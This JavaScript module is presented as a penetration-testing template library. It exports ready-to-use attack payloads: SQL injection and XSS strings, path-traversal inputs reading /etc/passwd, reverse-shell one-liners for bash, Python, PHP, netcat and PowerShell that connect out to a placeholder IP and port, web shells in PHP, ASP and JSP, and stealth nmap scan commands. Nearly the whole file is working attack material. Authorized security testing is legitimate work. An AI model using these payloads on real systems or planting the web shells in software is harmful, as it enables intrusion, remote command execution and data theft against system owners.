// Billy's Pentest Templates - Created by BillyC0der
// Common exploit templates and snippets for penetration testing

export const exploitTemplates = {
  sqli: {
    basic: {
      name: "Basic SQL Injection",
      payload: "' OR '1'='1' --",
      description: "Basic authentication bypass"
    },
    union: {
      name: "UNION SQL Injection",
      payload: "' UNION SELECT 1,2,3,4,5 --",
      description: "Extract data using UNION"
    },
    blind: {
      name: "Blind SQL Injection",
      payload: "' AND (SELECT SUBSTRING(@@version,1,1))='5' --",
      description: "Boolean-based blind SQLi"
    }
  },
  
  xss: {
    basic: {
      name: "Basic XSS",
      payload: "<script>alert('XSS')</script>",
      description: "Basic XSS payload"
    },
    dom: {
      name: "DOM XSS",
      payload: "javascript:alert('DOM XSS')",
      description: "DOM-based XSS"
    },
    bypass: {
      name: "Filter Bypass XSS",
      payload: "<img src=x onerror=alert('XSS')>",
      description: "Bypasses basic filters"
    }
  },

  rce: {
    php: {
      name: "PHP Code Execution",
      payload: "<?php system($_GET['cmd']); ?>",
      description: "PHP web shell"
    },
    python: {
      name: "Python Code Execution",
      payload: "__import__('os').system('id')",
      description: "Python command execution"
    }
  },

  lfi: {
    basic: {
      name: "Basic LFI",
      payload: "../../../../etc/passwd",
      description: "Basic path traversal"
    },
    nullbyte: {
      name: "Null Byte LFI",
      payload: "../../../../etc/passwd%00",
      description: "Null byte termination"
    },
    wrapper: {
      name: "PHP Wrapper LFI",
      payload: "php://filter/read=convert.base64-encode/resource=index.php",
      description: "PHP filter wrapper"
    }
  }
};

export const payloadTemplates = {
  reverseShells: {
    bash: {
      name: "Bash Reverse Shell",
      template: "bash -i >& /dev/tcp/[IP]/[PORT] 0>&1",
      description: "Standard bash reverse shell"
    },
    python: {
      name: "Python Reverse Shell",
      template: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
      description: "Python reverse shell"
    },
    php: {
      name: "PHP Reverse Shell",
      template: `php -r '$sock=fsockopen("[IP]",[PORT]);exec("/bin/sh -i <&3 >&3 2>&3");'`,
      description: "PHP reverse shell"
    },
    netcat: {
      name: "Netcat Reverse Shell",
      template: "nc -e /bin/sh [IP] [PORT]",
      description: "Netcat reverse shell"
    },
    powershell: {
      name: "PowerShell Reverse Shell",
      template: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('[IP]',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
      description: "PowerShell reverse shell"
    }
  },

  webShells: {
    php: {
      name: "PHP Web Shell",
      template: `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`,
      description: "Simple PHP web shell"
    },
    asp: {
      name: "ASP Web Shell",
      template: `<%eval request("cmd")%>`,
      description: "Simple ASP web shell"
    },
    jsp: {
      name: "JSP Web Shell",
      template: `<%@ page import="java.util.*,java.io.*"%><%if (request.getParameter("cmd") != null) {out.println("Command: " + request.getParameter("cmd") + "<BR>");Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) {out.println(disr);disr = dis.readLine();}}%>`,
      description: "JSP web shell"
    }
  }
};

export const reconTemplates = {
  nmap: {
    basic: "nmap -sS -sV -O [TARGET]",
    stealth: "nmap -sS -f -D RND:10 [TARGET]",
    comprehensive: "nmap -sS -sU -sV -sC -O -A --script vuln [TARGET]"
  },
  
  enumeration: {
    smb: "enum4linux -a [TARGET]",
    dns: "dig @[DNS_SERVER] [DOMAIN] ANY",
    web: "dirb http://[TARGET]/ /usr/share/wordlists/dirb/common.txt"
  }
};
